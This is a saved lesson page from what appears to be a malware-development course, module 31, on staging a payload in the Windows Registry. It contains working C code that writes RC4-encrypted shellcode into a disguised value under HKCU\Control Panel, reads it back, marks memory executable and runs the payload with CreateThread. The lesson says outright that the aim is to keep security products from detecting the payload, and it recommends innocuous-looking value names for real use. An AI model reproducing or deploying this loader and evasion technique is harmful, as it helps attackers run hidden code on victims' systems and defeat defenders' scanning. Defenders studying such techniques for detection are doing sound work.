<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">
        <link rel="stylesheet" href="Payload%20Staging%20-%20Windows%20Registry_files/template.css">
        <link rel="shortcut icon" href="#favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Payload%20Staging%20-%20Windows%20Registry_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Payload%20Staging%20-%20Windows%20Registry_files/css2.css" rel="stylesheet">
        <link href="Payload%20Staging%20-%20Windows%20Registry_files/css2_002.css" rel="stylesheet">
        <title>Payload Staging - Windows Registry</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Payload%20Staging%20-%20Windows%20Registry_files/app.fdbb573b.css"><link rel="stylesheet" href="Payload%20Staging%20-%20Windows%20Registry_files/app.fdbb573b.css"><link rel="stylesheet" href="Payload%20Staging%20-%20Windows%20Registry_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="#" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Payload%20Staging%20-%20Windows%20Registry_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="#" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="#faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="#syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="#pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="#profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="#logout" method="POST">
            <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="#modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 31 - Payload Staging - Windows Registry
            </div>
            <div class="ml-2 w-4 h-4 bg-green-800 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Payload%20Staging%20-%20Windows%20Registry_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Payload%20Staging%20-%20Windows%20Registry_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Payload%20Staging%20-%20Windows%20Registry_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="#download/file/Registry" target="_blank">
                    <img src="Payload%20Staging%20-%20Windows%20Registry_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Payload Staging - Windows Registry</h2>
<h3>Introduction</h3>
<p>The previous module showed that a payload does not necessarily need 
to be stored inside the malware. Instead, the payload can be fetched at 
runtime by the malware. This module will show a similar technique, 
except the payload will be written as a registry key value and then 
fetched from the Registry when required. Since the payload will be 
stored in the Registry, if security solutions scan the malware they will
 be unable to detect or find any payload within.</p>
<p>This code in this module is divided into two parts. The first part is
 writing the encrypted payload to a registry key. The second part reads 
the payload from the same registry key, decrypts it and executes it. The
 module will not explain the encryption/decryption process as this was 
explained in prior modules.</p>
<p>This module will also introduce the concept of <a href="https://www.techonthenet.com/c_language/directives/ifdef.php" target="_blank">Conditional Compilation</a>.</p>
<h3>Conditional Compilation</h3>
<p>Conditional compilation is a way to include code inside a project 
which the compiler will either compile or not compile. This will be used
 by the implementation to decide whether it's reading or writing to the 
Registry.</p>
<p>The two sections below provide skeleton code as to how the read and 
write operations will be written using conditional compilation.</p>
<h4>Write Operation</h4>
<pre><code>	#define WRITEMODE

	// Code that will be compiled in both cases
	
	// if 'WRITEMODE' is defined 
	#ifdef WRITEMODE
		// The code that will be compiled 
		// Code that's needed to write the payload to the Registry
	#endif

	// if 'READMODE' is defined 
	#ifdef READMODE
		// Code that will NOT be compiled
	#endif

</code></pre>
<h4>Read Operation</h4>
<pre><code>	#define READMODE

	// Code that will be compiled in both cases
	
	// if 'READMODE' is defined 
	#ifdef READMODE
		// The code that will be compiled
		// Code that's needed to read the payload from the Registry
	#endif
	
	// if 'WRITEMODE' is defined 
	#ifdef WRITEMODE
		// Code that will NOT be compiled
	#endif
	
</code></pre>
<h3>Writing To The Registry</h3>
<p>This section will walk through the <code>WriteShellcodeToRegistry</code> function. The function takes two parameters:</p>
<ol>
<li>
<p><code>pShellcode</code> - The payload to be written.</p>
</li>
<li>
<p><code>dwShellcodeSize</code> - The size of the payload to be written.</p>
</li>
</ol>
<h4>REGISTRY &amp; REGSTRING</h4>
<p>The code starts with two pre-defined constants <code>REGISTRY</code> and <code>REGSTRING</code> which are set to <code>Control Panel</code> and <code>MalDevAcademy</code> respectively.</p>
<pre><code>// Registry key to read / write
#define     REGISTRY            "Control Panel"
#define     REGSTRING           "MalDevAcademy"
</code></pre>
<p><code>REGISTRY</code> is the name of the registry key that will hold the payload. The full path of <code>REGISTRY</code> will be <code>Computer\HKEY_CURRENT_USER\Control Panel</code>.</p>
<p><img src="Payload%20Staging%20-%20Windows%20Registry_files/registry-img.png" alt="image"></p>
<p>What the function will be doing programmatically is creating a new <code>String Value</code> under this registry key to store the payload. <code>REGSTRING</code> is the name of the string value that will be created. Obviously, in a real situation, use a more realistic value such as <code>PanelUpdateService</code> or <code>AppSnapshot</code>.</p>
<p><img src="Payload%20Staging%20-%20Windows%20Registry_files/registry-new-string-value.png" alt="image"></p>
<h4>Opening a Handle To The Registry Key</h4>
<p>The <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa" target="_blank">RegOpenKeyExA</a>
 WinAPI is used to open a handle to the specified registry key which is a
 prerequisite to creating, editing or deleting values under the registry
 key.</p>
<pre><code>LSTATUS RegOpenKeyExA(
  [in]           HKEY   hKey, 		// A handle to an open registry key
  [in, optional] LPCSTR lpSubKey, 	// The name of the registry subkey to be opened (REGISTRY constant)
  [in]           DWORD  ulOptions, 	// Specifies the option to apply when opening the key - Set to 0
  [in]           REGSAM samDesired, 	// Access Rights
  [out]          PHKEY  phkResult 	// A pointer to a variable that receives a handle to the opened key
);
</code></pre>
<p>The fourth parameter of the <code>RegOpenKeyExA</code> WinAPI defines the access rights to the registry key. Because the program needs to create a value under the registry key, <code>KEY_SET_VALUE</code> was selected. The full list of registry access rights can be found <a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights" target="_blank">here</a>.</p>
<pre><code>STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &amp;hKey);
</code></pre>
<h4>Setting Registry Value</h4>
<p>Next, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa" target="_blank">RegSetValueExA</a> WinAPI is used which takes the opened handle from <code>RegOpenKeyExA</code> and creates a new value that is based on the second parameter, <code>REGSTRING</code>. It will also write the payload to the newly created value.</p>
<pre><code>LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,            // A handle to an open registry key
  [in, optional] LPCSTR     lpValueName,     // The name of the value to be set (REGSTRING constant)
                 DWORD      Reserved,        // Set to 0
  [in]           DWORD      dwType,          // The type of data pointed to by the lpData parameter
  [in]           const BYTE *lpData,         // The data to be stored
  [in]           DWORD      cbData           // The size of the information pointed to by the lpData parameter, in bytes
);
</code></pre>
<p>It is also worth noting that the fourth parameter specifies the data type for the registry value. In this case, it's set to <code>REG_BINARY</code> since the payload is simply a list of bytes but the complete list of data types can be found <a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types" target="_blank">here</a>.</p>
<pre><code>STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
</code></pre>
<h4>Closing Registry Key Handle</h4>
<p>Finally, <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey" target="_blank">RegCloseKey</a> is used to close the handle of the registry key that was opened.</p>
<pre><code>LSTATUS RegCloseKey(
  [in] HKEY hKey // Handle to an open registry key to be closed
);
</code></pre>
<h4>Writing To The Registry - Code Snippet</h4>
<pre><code>// Registry key to read / write
#define     REGISTRY            "Control Panel"
#define     REGSTRING           "MalDevAcademy"

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL        bSTATE  = TRUE;
    LSTATUS     STATUS  = NULL;
    HKEY        hKey    = NULL;

    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &amp;hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS){
        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}

</code></pre>
<h3>Reading The Registry</h3>
<p>Now that the payload has been written to the <code>MalDevAcademy</code> string under the <code>Computer\HKEY_CURRENT_USER\Control Panel</code> registry key, it is time to write the other implementation which will contain the decryption functionality that <code>HellShell.exe</code> provided.</p>
<p>This section will walk through the <code>ReadShellcodeFromRegistry</code> function (shown below). The function takes two parameters:</p>
<ol>
<li>
<p><code>sPayloadSize</code> - The payload size to read.</p>
</li>
<li>
<p><code>ppPayload</code> - A buffer that will store the outputted payload.</p>
</li>
</ol>
<h4>Heap Allocation</h4>
<p>The function starts by allocating memory to the size of <code>sPayloadSize</code> which will store the payload.</p>
<pre><code>pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
</code></pre>
<h4>Read Registry Value</h4>
<p>The <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-reggetvaluea" target="_blank">RegGetValueA</a> function requires the registry key and value to read, which are <code>REGISTRY</code> and <code>REGSTRING</code>,
 respectively. In the previous module, it was possible to fetch the 
payload from the internet in several chunks of any size, however, when 
working with <code>RegGetValueA</code> this is not possible since it 
does not read the bytes as a stream of data but rather all at once. All 
of this means that knowing the payload size is a requirement in the 
reading implementation.</p>
<pre><code>LSTATUS RegGetValueA(
  [in]                HKEY    hkey,     // A handle to an open registry key
  [in, optional]      LPCSTR  lpSubKey, // The path of a registry key relative to the key specified by the hkey parameter
  [in, optional]      LPCSTR  lpValue,  // The name of the registry value.
  [in, optional]      DWORD   dwFlags,  // The flags that restrict the data type of value to be queried
  [out, optional]     LPDWORD pdwType,  // A pointer to a variable that receives a code indicating the type of data stored in the specified value
  [out, optional]     PVOID   pvData,   // A pointer to a buffer that receives the value's data
  [in, out, optional] LPDWORD pcbData   // A pointer to a variable that specifies the size of the buffer pointed to by the pvData parameter, in bytes
);
</code></pre>
<p>The fourth parameter can be used to restrict the data type, however, this implementation uses <code>RRF_RT_ANY</code>, signifying any data type. Alternatively, <code>RRF_RT_REG_BINARY</code> could have been used since the payload is of binary data type. Lastly, the payload is read to <code>pBytes</code> which was previously allocated using <code>HeapAlloc</code>.</p>
<pre><code>STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &amp;dwBytesRead);
</code></pre>
<h4>Reading Registry - Code Snippet</h4>
<pre><code>BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload) {

    LSTATUS     STATUS            = NULL;
    DWORD       dwBytesRead       = sPayloadSize;
    PVOID       pBytes            = NULL;


    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
    if (pBytes == NULL){
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &amp;dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    if (sPayloadSize != dwBytesRead) {
        printf("[!] Total Bytes Read : %d ; Instead Of Reading : %d\n", dwBytesRead, sPayloadSize);
        return FALSE;
    }

    *ppPayload = pBytes;

    return TRUE;
}

</code></pre>
<h4>Executing Payload</h4>
<p>Once the payload is read from the registry and stored inside the allocated buffer, the <code>RunShellcode</code> function is used to execute the payload. Note that this function was explained in earlier modules.</p>
<pre><code>
BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection   = NULL;

    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press &lt;Enter&gt; To Run ... ");
    getchar();

    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

</code></pre>
<h3>Writing To The Registry - Demo</h3>
<p>Before executing the compiled code shown above, the registry key looks like this:</p>
<p><img src="Payload%20Staging%20-%20Windows%20Registry_files/registry-demo-1.png" alt="image"></p>
<br>
<p>After running the program, a new registry string value is created with the RC4 encrypted payload.</p>
<p><img src="Payload%20Staging%20-%20Windows%20Registry_files/registry-demo-2.png" alt="image"></p>
<br>
<p>Double-clicking on <code>MaldevAcademy</code> will show the payload in HEX and ASCII format.</p>
<p><img src="Payload%20Staging%20-%20Windows%20Registry_files/registry-demo-3.png" alt="image"></p>
<br>
<h3>Reading The Registry - Demo</h3>
<p>The program begins by reading the encrypted payload from the Registry.</p>
<p><img src="Payload%20Staging%20-%20Windows%20Registry_files/registry-read-demo-1.png" alt="image"></p>
<br>
<p>Next, the program will decrypt the payload.</p>
<p><img src="Payload%20Staging%20-%20Windows%20Registry_files/registry-read-demo-2.png" alt="image"></p>
<br>
<p>Finally, the decrypted payload is executed.</p>
<p><img src="Payload%20Staging%20-%20Windows%20Registry_files/registry-read-demo-3.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Write an encrypted payload to the registry</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Read and execute the written payload</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="#modules/30"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="#modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="#modules/31/complete" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="#modules/31/progress" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="#modules/32"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="#" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="/" target="_blank">
#      </a></span><a class="text-gray-400 text-sm" href="/" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="/" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="/" target="_blank">        

        <script src="Payload%20Staging%20-%20Windows%20Registry_files/jquery-3.6.0.min.js"></script>
        <script src="Payload%20Staging%20-%20Windows%20Registry_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Payload%20Staging%20-%20Windows%20Registry_files/app.4474f4d1.css"><link rel="modulepreload" href="Payload%20Staging%20-%20Windows%20Registry_files/app.5f3af5ce.js"><link rel="stylesheet" href="Payload%20Staging%20-%20Windows%20Registry_files/app.4474f4d1.css"><script type="module" src="Payload%20Staging%20-%20Windows%20Registry_files/app.5f3af5ce.js"></script><script src="Payload%20Staging%20-%20Windows%20Registry_files/navbar.js"></script>
<script src="Payload%20Staging%20-%20Windows%20Registry_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 31;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "#complete/objective" : "#remove/objective",
        type: "POST",
        data: {
        _token: "aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>